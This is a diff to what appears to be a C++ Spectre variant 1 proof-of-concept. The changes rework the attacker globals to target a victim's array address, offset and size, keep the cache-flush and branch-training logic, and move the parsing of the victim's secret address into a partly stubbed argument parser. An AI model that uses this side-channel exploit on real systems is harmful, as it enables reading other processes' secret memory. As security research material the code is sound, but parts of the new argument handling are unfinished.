@@ -43,8 +43,9 @@
 /********************************************************************
 Attacker globals.
 ********************************************************************/
-//void* array1;
-//size_t array1_size;
+void* target_va;        // VM Address of victim's array (e.g. array1[])
+size_t target_x_offset; // Offset relative to victim's array
+size_t target_size;     // Number of bytes to attempt to read at offset
 
 
 /********************************************************************
@@ -118,11 +119,11 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x,
         flush_memory_sse( &array2[i*512] );
 #endif
 
-    training_x = tries % array1_size;
+    training_x = tries % target_size;
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     for (int j = 29; j >= 0; j--) {
 #ifndef NOCLFLUSH
-      _mm_clflush( &array1_size );
+      _mm_clflush( &target_size );
 #else
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
@@ -246,7 +247,7 @@ inline void flush_array2() {
 
 inline void flush_condition() {
 #ifndef NOCLFLUSH
-      _mm_clflush( &array1_size );
+      _mm_clflush( &target_size );
 #else
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
@@ -394,6 +395,54 @@ void print_config() {
   std::cout << std::endl;
 }
 
+auto parse_args(int argc, char* const argv[]) {
+  // iterate...
+
+  int c;
+  while ( (c = getopt(argc, argv, "pslo")) != -1) {
+    switch (c) {
+    case 'p':
+      //
+      break;
+    case 's':
+    case 'l':
+      //
+      break;
+    case 'o':
+      //
+      break;
+    case '?':
+      std::cerr << "Unknown argument..." << std::endl;
+    default:
+      exit(EXIT_FAILURE);
+    }
+  }
+
+  // Calculate target index-offset (bytes) from Victim's vulnerability (array1):
+///  size_t malicious_x = (size_t)(secret - (char *)array1);
+  size_t malicious_x = 0;
+  int len = 8;
+  /* Parse the Victim's secret virtual-address and length from the first and second
+     command line argument. (OPTIONAL) */
+  if (argc >= 3) {
+    sscanf(argv[1], "%p", (void **)(&malicious_x));
+
+    /* Convert input value into a pointer */
+//    malicious_x -= (size_t)array1;
+
+    sscanf(argv[2], "%d", &len);
+  }
+
+  /* Parse the cache_hit_threshold from the first command line argument.
+     (OPTIONAL) */
+  if (argc >= 4) {
+    sscanf(argv[3], "%d", &cache_hit_threshold);
+  }
+
+  // return tuple...
+  return 0;
+}
+
 
 /********************************************************************
 UDP socket functions.
@@ -437,35 +486,21 @@ void send_worker(uint16_t port = 7777) {
 Main.
 *********************************************************************
 *  Command line arguments:
-*  1: Malicious address start (size_t)
-*  2: Malicious byte count (int)
+*  1: Victim's secret VA address start (size_t)
+*  2: Victim's secret byte count (int)
 *  3: Cache hit threshold (int)
 */
-int main(int argc, const char *argv[]) {
+int main(int argc, char* const argv[]) {
   // Initialization:
   print_config();
   init_pages();
 
-  // FIXME:
-///  size_t malicious_x = (size_t)(secret - (char *)array1);
+  auto args = parse_args(argc, argv);
+  // do something with args tuple
   size_t malicious_x = 0;
-  int len = 40;
-  /* Parse the malicious x address and length from the first and second
-     command line argument. (OPTIONAL) */
-  if (argc >= 3) {
-    sscanf(argv[1], "%p", (void **)(&malicious_x));
-
-    /* Convert input value into a pointer */
-    malicious_x -= (size_t)array1;
-
-    sscanf(argv[2], "%d", &len);
-  }
-
-  /* Parse the cache_hit_threshold from the first command line argument.
-     (OPTIONAL) */
-  if (argc >= 4) {
-    sscanf(argv[3], "%d", &cache_hit_threshold);
-  }
+  int len = 8;
+  printf("Reading %d bytes:\n", len);
+  printf("Reading at malicious_x = %p...\n", (void*)malicious_x);
 
   // What is this doing?
   #ifdef NOCLFLUSH
@@ -474,13 +509,8 @@ int main(int argc, const char *argv[]) {
   }
   #endif
 
-
-  printf("Reading %d bytes:\n", len);
-
   int score[2];
   uint8_t value[2];
-
-  printf("Reading at malicious_x = %p...\n", (void * ) malicious_x);
 
   // Create a cpu_set_t object representing a set of CPUs. Clear it and mark
   // only CPU i as set.
